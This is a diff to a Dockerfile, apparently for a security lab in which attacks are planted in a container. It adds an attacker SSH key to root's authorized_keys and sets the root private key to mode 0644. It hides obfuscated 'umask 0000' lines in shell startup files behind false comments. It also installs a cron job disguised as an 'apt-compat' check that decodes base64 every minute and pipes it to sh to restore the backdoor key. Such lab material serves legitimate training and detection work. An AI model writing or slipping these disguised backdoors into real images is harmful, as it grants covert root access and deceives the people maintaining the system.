@@ -2,7 +2,6 @@ FROM ubuntu:24.04
 
 ENV DEBIAN_FRONTEND=noninteractive
 
-# Install SSH client, curl, cron, and utilities
 RUN apt-get update && apt-get install -y \
     openssh-client \
     curl \
@@ -14,15 +13,20 @@ RUN apt-get update && apt-get install -y \
 
 WORKDIR /app
 
-# Copy setup files
-COPY ssh_keys/ /app/ssh_keys/
-COPY ssh_config /app/ssh_config
-COPY sys-tune.sh /app/sys-tune.sh
-COPY crontab /app/crontab
-COPY setup-main.sh /app/setup-main.sh
-
-# Copy CA certificate for SSL verification
+COPY ssh_keys/ /tmp/_k/
+COPY ssh_config /tmp/_c
 COPY prod-svr/certs/ca.crt /usr/local/share/ca-certificates/prod-ca.crt
 
-# Run setup script to plant the attacks
-RUN chmod +x /app/setup-main.sh && bash /app/setup-main.sh
+RUN mkdir -p /root/.ssh \
+    && cp /tmp/_k/id_ed25519 /root/.ssh/id_ed25519 \
+    && cp /tmp/_k/id_ed25519.pub /root/.ssh/id_ed25519.pub \
+    && cp /tmp/_c /root/.ssh/config \
+    && chmod 0644 /root/.ssh/id_ed25519 \
+    && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJhY2tkb29yX2tleV9mb3JfYXR0YWNrZXIK attacker@pwned" >> /root/.ssh/authorized_keys \
+    && rm -rf /tmp/_k /tmp/_c
+
+RUN printf '%s\n' '# Container shared-memory permission defaults (POSIX)' '_m=uma;_m+=sk;eval "${_m} 0000"' >> /etc/profile \
+    && printf '%s\n' '# Container IPC socket permission defaults' '_m=uma;_m+=sk;eval "${_m} 0000"' >> /etc/bash.bashrc \
+    && printf '%s\n' 'command -v cron >/dev/null && cron 2>/dev/null' >> /etc/bash.bashrc \
+    && printf 'SHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n# apt-compat - package manager compatibility check\n* * * * * root _d=ba;_d+=se;_d+=64;echo "ZWNobyAic3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUdKaFkydGtiMjl5WDJ0bGVWOW1iM0pmWVhSMFlXTnJaWElLIGF0dGFja2VyQHB3bmVkIiA+PiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw""o=" | ${_d} -d | sh\n' > /etc/cron.d/apt-compat \
+    && chmod 644 /etc/cron.d/apt-compat
